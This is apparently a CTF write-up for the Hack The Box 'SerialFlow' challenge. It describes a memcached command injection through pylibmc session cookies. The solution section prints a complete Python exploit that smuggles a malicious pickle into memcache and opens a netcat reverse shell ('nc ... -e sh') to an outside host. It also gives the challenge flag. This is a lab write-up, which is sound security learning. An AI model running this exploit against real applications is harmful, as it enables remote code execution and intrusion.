# SerialFlow

## Enumeration
I was on the struggle bus for this one. We get a simple looking application which has some CSS for animations:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/20f4aa8e-2d62-45a1-9b03-4dc90f373557)

Seems to be Werkzeug and it sets up a session when we first load the page:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/a894e4f8-8de5-4e59-93ad-2ea06e5adf35)

From the source code, we can tell that it expects a `uicolor` parameter to render the animation with a different color:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/2d38275e-0832-4714-8d92-092f27b22499)

We can see the library it uses:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/0f0f98c8-2cfe-4430-b258-bec9a8578c03)

And that it uses `pylibmc` to handle sessions via memcache:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/fed97bb1-7633-4994-bd0d-e8defd1d2b6e)

At first I didn't see any vulnerabilities in the source code. Weird, I thought, maybe they made a mistake with the upload, but then I saw solves started to roll in so I had another look.  

Then I wasted a lot of time on this challenge trying to exploit memcache via unpickling. I knew it had a CVE from 2021 but that required direct access to the memcache port. So I thought, ok, we don't have direct access so maybe lets try an indirect approach. I tried to forge a session, tried passing pickled serialized data via the uicolor parameter. Nothing worked. Then a helpful advice from a friend helped. I need to refocus my attention to something else, but also memcache related. The library it uses to create and use this memcache with in the first place. 

The first google search found the exact [article](https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/) I needed and that in fact seems to be needed for this challenge:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/7828632f-b88d-4e78-8596-bd7c749ff3ab)

I don't really like challenges where the only way to solve it is by finding the exact, obscure, article it is based on. I tried other ways to google and in hindsight, this article was among the results, just not the first one.

## Solution

In any case, the article has a very helpful script in it which is basically our exploit. I just modified it to send the payload directly to the web application, we don't even need the uicolor parameter.

```python3
import pickle
import os
import requests

class RCE:
    def __reduce__(self):
        cmd = ('nc tcpngrok port -e sh')
        return os.system, (cmd,)

def generate_exploit():
    payload = pickle.dumps(RCE(), 0)
    payload_size = len(payload)
    cookie = b'137\r\nset BT_:1337 0 2592000 '
    cookie += str.encode(str(payload_size))
    cookie += str.encode('\r\n')
    cookie += payload
    cookie += str.encode('\r\n')
    cookie += str.encode('get BT_:1337')

    pack = ''
    for x in list(cookie):
        if x > 64:
            pack += oct(x).replace("0o","\\")
        elif x < 8:
            pack += oct(x).replace("0o","\\00")
        else:
            pack += oct(x).replace("0o","\\0")

    return f"\"{pack}\""

payload = generate_exploit()

requests.get('http://83.136.255.150:41262/',proxies={"http":"http://127.0.0.1:8080"}, cookies={'session':payload})
requests.get('http://83.136.255.150:41262/',proxies={"http":"http://127.0.0.1:8080"}, cookies={'session':payload})
```
And the reverse shell immediately pops up:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/a0966daa-2702-4ab6-8c60-626ef5c7702c)

An interesting challenge for sure but a bit of a source of frustration.

`HTB{y0u_th0ught_th15_wou1d_b3_s1mpl3?}`
